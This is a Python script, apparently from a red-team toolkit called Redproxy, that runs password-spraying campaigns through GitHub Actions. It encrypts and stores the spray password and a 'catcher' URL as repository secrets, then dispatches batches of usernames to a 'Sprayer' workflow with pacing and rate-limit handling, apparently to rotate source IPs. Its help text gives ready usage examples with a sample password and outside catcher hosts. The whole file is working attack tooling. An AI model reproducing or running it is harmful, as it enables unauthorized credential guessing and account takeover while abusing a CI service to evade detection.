"""
Redproxy Kicker — orchestrates GitHub Actions spray workflows.

Manages secrets, dispatches workflows in batches, tracks progress,
and implements retry logic with rate-limit handling.
"""
import sys
import os
import time
import json
import argparse
import configparser
from pathlib import Path
from datetime import datetime

import requests
import nacl.encoding
import nacl.public

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib.common import log, setup_logging, LogLevel, read_lines

logger = setup_logging("kicker")


class GitHubActionsClient:
    """Client for GitHub Actions API operations."""

    API_BASE = "https://api.github.com"

    def __init__(self, owner: str, repo: str, token: str):
        self.owner = owner
        self.repo = repo
        self.headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": f"Bearer {token}",
            "X-GitHub-Api-Version": "2022-11-28",
        }
        self._public_key = None
        self._key_id = None

    def _request(self, method: str, endpoint: str, retries: int = 3, **kwargs):
        """Make an API request with retry logic."""
        url = f"{self.API_BASE}/repos/{self.owner}/{self.repo}/{endpoint}"

        for attempt in range(retries):
            try:
                resp = getattr(requests, method)(url, headers=self.headers, **kwargs)

                if resp.status_code == 403 and "rate limit" in resp.text.lower():
                    wait = int(resp.headers.get("X-RateLimit-Reset", 60)) - int(time.time())
                    wait = max(wait, 30)
                    log(logger, f"[!] Rate limited, waiting {wait}s...", LogLevel.WARNING)
                    time.sleep(wait)
                    continue

                return resp

            except requests.RequestException as e:
                if attempt < retries - 1:
                    log(logger, f"[!] Request failed (attempt {attempt + 1}): {e}", LogLevel.WARNING)
                    time.sleep(5 * (attempt + 1))
                else:
                    raise

        return resp

    def fetch_public_key(self):
        """Fetch the repository's public key for secret encryption."""
        if self._public_key:
            return self._public_key, self._key_id

        resp = self._request("get", "actions/secrets/public-key")
        if resp.status_code != 200:
            log(logger, f"[-] Failed to fetch public key: HTTP {resp.status_code}", LogLevel.ERROR)
            sys.exit(1)

        data = resp.json()
        self._public_key = data["key"]
        self._key_id = data["key_id"]
        log(logger, "[+] Public key fetched", LogLevel.SUCCESS)
        return self._public_key, self._key_id

    def fetch_workflow_id(self, workflow_name: str):
        """Get workflow ID by name."""
        resp = self._request("get", "actions/workflows")
        if resp.status_code != 200:
            log(logger, f"[-] Failed to fetch workflows: HTTP {resp.status_code}", LogLevel.ERROR)
            sys.exit(1)

        for wf in resp.json().get("workflows", []):
            if wf["name"] == workflow_name:
                log(logger, f"[+] Workflow '{workflow_name}' ID: {wf['id']}", LogLevel.SUCCESS)
                return wf["id"]

        log(logger, f"[-] Workflow '{workflow_name}' not found", LogLevel.ERROR)
        sys.exit(1)

    def update_secret(self, name: str, value: str):
        """Encrypt and update a repository secret."""
        pub_key, key_id = self.fetch_public_key()

        pk = nacl.public.PublicKey(pub_key.encode(), encoder=nacl.encoding.Base64Encoder)
        sealed = nacl.public.SealedBox(pk)
        encrypted = nacl.encoding.Base64Encoder.encode(sealed.encrypt(value.encode()))

        resp = self._request("put", f"actions/secrets/{name}", json={
            "encrypted_value": encrypted.decode(),
            "key_id": key_id,
        })

        if resp.status_code in (201, 204):
            return True

        log(logger, f"[-] Failed to update secret '{name}': HTTP {resp.status_code}", LogLevel.ERROR)
        return False

    def dispatch_workflow(self, workflow_id: int, ref: str = "main"):
        """Trigger a workflow dispatch."""
        resp = self._request("post", f"actions/workflows/{workflow_id}/dispatches", json={"ref": ref})
        return resp.status_code == 204


def parse_args():
    parser = argparse.ArgumentParser(
        description="Redproxy Kicker — orchestrate spray via GitHub Actions",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Required GitHub token permissions (Fine-grained):\n"
            "  actions:read, actions:write, secrets:read, secrets:write\n\n"
            "Examples:\n"
            "  python kicker.py -u users.txt -p 'Winter2024!' -c https://vps.com/wow-amazing --secure\n"
            "  python kicker.py -u users.txt -p 'Test123' -c http://1.2.3.4:20005/wow-amazing -b 10 --delay 15\n"
            "  python kicker.py -u users.txt -p x -c https://vps.com/wow-amazing --workflow 'View IP Rotating and JA4'\n"
        ),
    )
    parser.add_argument("-u", "--userlist", required=True, help="File with usernames (one per line)")
    parser.add_argument("-p", "--password", required=True, help="Password to spray")
    parser.add_argument("-c", "--catcher", required=True, help="Catcher URL (e.g. https://host/wow-amazing)")
    parser.add_argument("-s", "--secure", action="store_true", default=False, help="Catcher uses TLS")
    parser.add_argument("-b", "--batch-size", type=int, default=5, help="Users per workflow run (default: 5)")
    parser.add_argument("-d", "--delay", type=int, default=10, help="Seconds between batches (default: 10)")
    parser.add_argument("--workflow", default="Sprayer", help="Workflow name (default: Sprayer)")
    parser.add_argument("--config", default="config.ini", help="Config file path")
    parser.add_argument("--resume", type=int, default=0, help="Resume from batch N (skip first N)")
    parser.add_argument("--dry-run", action="store_true", help="Show batches without dispatching")
    return parser.parse_args()


def load_config(config_path: str):
    """Load GitHub config from environment variables or INI file."""
    owner = os.getenv("GITHUB_OWNER")
    repo = os.getenv("GITHUB_REPO")
    token = os.getenv("GITHUB_TOKEN")

    if owner and repo and token:
        return owner, repo, token

    path = Path(config_path)
    if not path.exists():
        path = Path(__file__).parent / config_path

    if not path.exists():
        log(logger, f"[-] Config not found: {config_path}", LogLevel.ERROR)
        log(logger, "    Set GITHUB_OWNER, GITHUB_REPO, GITHUB_TOKEN env vars or create config.ini", LogLevel.ERROR)
        sys.exit(1)

    config = configparser.ConfigParser()
    config.read(str(path))

    try:
        return config["GitHub"]["owner"], config["GitHub"]["repo"], config["GitHub"]["token"]
    except KeyError as e:
        log(logger, f"[-] Missing config key: {e}", LogLevel.ERROR)
        sys.exit(1)


def main():
    args = parse_args()

    log(logger, "=" * 50, LogLevel.INFO)
    log(logger, "REDPROXY KICKER", LogLevel.INFO)
    log(logger, "=" * 50, LogLevel.INFO)

    owner, repo, token = load_config(args.config)
    client = GitHubActionsClient(owner, repo, token)
    workflow_id = client.fetch_workflow_id(args.workflow)

    log(logger, "[*] Updating workflow secrets...", LogLevel.INFO)
    secrets = {
        "password": args.password,
        "catcherurl": args.catcher,
        "catchertls": str(args.secure).lower(),
    }
    for name, value in secrets.items():
        if not client.update_secret(name, value):
            log(logger, f"[-] Failed to update '{name}'. Aborting.", LogLevel.ERROR)
            sys.exit(1)

    usernames = read_lines(args.userlist)
    batches = [usernames[i:i + args.batch_size] for i in range(0, len(usernames), args.batch_size)]

    log(logger, f"\n[*] {len(usernames)} users -> {len(batches)} batches (size {args.batch_size})", LogLevel.INFO)
    log(logger, f"[*] Delay: {args.delay}s | Workflow: {args.workflow}", LogLevel.INFO)
    log(logger, f"[*] Catcher: {args.catcher}", LogLevel.INFO)

    if args.dry_run:
        log(logger, "\n[DRY RUN] Batches:", LogLevel.WARNING)
        for i, batch in enumerate(batches):
            status = "SKIP" if i < args.resume else "SEND"
            log(logger, f"  Batch {i+1}: [{status}] {', '.join(batch)}", LogLevel.INFO)
        return

    dispatched = 0
    failed = 0
    start_time = time.time()

    for i, batch in enumerate(batches):
        if i < args.resume:
            log(logger, f"[~] Batch {i+1}/{len(batches)}: skipped (resume)", LogLevel.DEBUG)
            continue

        username_list = ",".join(batch)

        if not client.update_secret("usernames", username_list):
            log(logger, f"[-] Batch {i+1}: failed to update usernames", LogLevel.ERROR)
            failed += 1
            continue

        if client.dispatch_workflow(workflow_id):
            dispatched += 1
            log(logger, f"[+] Batch {i+1}/{len(batches)}: dispatched ({len(batch)} users)", LogLevel.SUCCESS)
        else:
            failed += 1
            log(logger, f"[-] Batch {i+1}/{len(batches)}: FAILED", LogLevel.ERROR)

        if i < len(batches) - 1:
            time.sleep(args.delay)

    elapsed = time.time() - start_time

    log(logger, "\n" + "=" * 50, LogLevel.INFO)
    log(logger, f"Dispatched: {dispatched} | Failed: {failed} | Time: {elapsed:.0f}s", LogLevel.INFO)
    log(logger, "=" * 50, LogLevel.INFO)

    state = {
        "timestamp": datetime.utcnow().isoformat(),
        "total_users": len(usernames),
        "total_batches": len(batches),
        "dispatched": dispatched,
        "failed": failed,
        "batch_size": args.batch_size,
    }
    Path("output").mkdir(exist_ok=True)
    Path("output/kicker_state.json").write_text(json.dumps(state, indent=2))


if __name__ == "__main__":
    main()
